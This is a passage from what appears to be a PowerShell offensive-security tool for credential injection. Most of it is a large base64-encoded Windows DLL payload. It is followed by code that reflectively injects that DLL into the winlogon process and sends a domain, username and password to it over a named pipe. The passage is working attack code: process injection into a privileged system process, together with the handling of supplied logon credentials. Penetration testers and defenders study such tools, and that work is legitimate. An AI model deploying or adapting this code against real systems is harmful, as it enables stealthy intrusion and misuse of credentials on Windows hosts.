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CmmKagpqimsKa4psCmyKbQptim4KbopvCm+KYApwinEKcYpyCnOKdAp0inUKdYp2CnaKdwp3iniKeQp3iogKiIqJCosKi4qFitYK1orXCtqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrwAAADABAOQAAAAQqRipIKkoqXipiKmYqaipuKnIqdip6Kn4qQiqGKooqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAAAEABAAgCAAAIoBigKKA4oEigWKBooHigiKCYoKiguKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIYoiiiOKJIoliiaKJ4ooiimKKooriiyKLYouii+KIIoxijKKM4o0ijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK7QruCu8K4ArxCvIK8wr0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwBQAQDIAAAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpQAAAGABALAAAABgrWitcK14rYCtiK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AcAEAKAAAAACgCKAQoBigIKAooDCgOKBAoEigUKBYoGCgaKBwoAAAAIABAAwAAABYpwAAALABAHgAAAAwoDigIKIoojCiOKJAokiiUKJYomCiaKLgqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvQq+CroK+or7CvuK/Ar8iv0K/Yr+Cv6K/wr/ivAMABAPwAAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCguKDAoMig0KDYoOCg6KDwoAChCKEQoRihIKEooTChOKFAoUihUKFYoWChaKFwoXihgKGIoZChmKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAogiiEKIYoiCiKKIwojiiQKJIolCiWKJgoqiiyKLoogijKKNgo3ijgKOIo5CjAKQIpBCkGKQgpCikMKQ4pECkSKRYpGCkaKRwpHikgKSIpJCkoKSopLCkuKTIp9Cn2KfgpwioMKhYqICoqKjIqPCoKKlgqZCpAAAAAAAAAAA="
        [Byte[]]$Logon32Bit = [Convert]::FromBase64String($Logon32Bit_Base64)
        [Byte[]]$Logon64Bit = [Convert]::FromBase64String($Logon64Bit_Base64)
        Invoke-ReflectivePEInjection -Bytes32 $Logon32Bit -Bytes64 $Logon64Bit -ProcId $WinLogonProcessId


        #Send domain, username, and password over the named pipe
        [Byte[]]$DomainBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($DomainName)
        [Byte[]]$UsernameBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($UserName)
        [Byte[]]$PasswordBytes = [System.Text.UnicodeEncoding]::Unicode.GetBytes($Password)

        $Pipe.WaitForConnection()

        $Pipe.Write($DomainBytes, 0, $DomainBytes.Count)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent domain"
        $Pipe.Write($UsernameBytes, 0, $UsernameBytes.Count)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent username"
        $Pipe.Write($PasswordBytes, 0, $PasswordBytes.Count)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent password"
        $Pipe.WriteByte($LogonTypeNum)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent logontype"
        $Pipe.WriteByte($AuthPackageNum)
        $Pipe.WaitForPipeDrain()
        Write-Verbose "Sent auth package"

        $RetMessageSize = 1024
        [Byte[]]$ReturnMessageBytes = New-Object Byte[] $RetMessageSize
        $ReadBytes = $Pipe.Read($ReturnMessageBytes, 0, $RetMessageSize)

        $ReturnMessage = [System.Text.ASCIIEncoding]::ASCII.GetString($ReturnMessageBytes, 0, $ReadBytes)
        Write-Output "DLL OUTPUT: $($ReturnMessage)"
    }
    finally
    {
        $Pipe.Dispose()
    }
}
